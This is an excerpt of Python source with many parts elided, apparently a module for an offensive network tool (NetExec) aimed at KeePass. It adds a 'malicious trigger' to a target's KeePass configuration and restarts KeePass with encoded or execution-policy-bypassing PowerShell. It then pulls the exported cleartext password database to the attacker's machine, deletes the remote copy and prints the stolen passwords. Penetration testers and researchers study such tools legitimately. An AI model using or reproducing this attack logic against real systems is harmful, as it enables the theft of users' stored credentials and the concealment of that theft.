...
class NXCModule:
    ...
    def __init__(self):
        ...
        with open(
            get_ps_script("keepass_trigger_module/RemoveKeePassTrigger.ps1")
        ) as remove_trigger_script_file:
            self.remove_trigger_script_str = remove_trigger_script_file.read()

        with open(
            get_ps_script("keepass_trigger_module/AddKeePassTrigger.ps1")
        ) as add_trigger_script_file:
            self.add_trigger_script_str = add_trigger_script_file.read()

        with open(
            get_ps_script("keepass_trigger_module/RestartKeePass.ps1")
    ...
    def add_trigger(self, context, connection):
        ...
        if self.trigger_added(context, connection):
            context.log.success(
                "Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files"
            )
        else:
    ...
    def restart(self, context, connection):
        ...
        if self.powershell_exec_method == "ENCODE":
            ...
            restart_keepass_script_cmd = (
                f"powershell.exe -e {restart_keepass_script_b64}"
            )
        ...
        while not found:
            ...
            for count, export_path in enumerate(
                ...
                try:
                    ...
                    local_full_path = (
                        f"{self.local_export_path}/{self.export_name.split('.'[0])}_{count!s}.{self.export_name.split('.'[1])}"
                        if count > 0
                        else f"{self.local_export_path}/{self.export_name}"
                    )

                    # downloads the exported database
                    with open(local_full_path, "wb") as f:
                        f.write(buffer.getbuffer())
                    remove_export_command_str = (
                        f"powershell.exe Remove-Item {export_path}"
                    )
                    connection.execute(remove_export_command_str, True)
                    context.log.success(
                        f'Moved remote "{export_path}" to local "{local_full_path}"'
                    )
                    found = True
                except Exception as e:
    ...
    def trigger_added(self, context, connection):
        ...
        return any(
            trigger.find("Name").text == self.trigger_name
    ...
    def put_file_execute_delete(self, context, connection, psh_script_str):
        ...
        script_execute_cmd = (
            f"powershell.exe -ep Bypass -F {self.remote_temp_script_path}"
        )
        connection.execute(script_execute_cmd, True)
        remove_remote_temp_script_cmd = (
            f'powershell.exe "Remove-Item "{self.remote_temp_script_path}""'
        )
    ...
    def print_password(self, context, entries):
        for entry in entries.findall("./String"):
            ...
            value_text = (
                value.text if value is not None and value.text is not None else "None"
            )
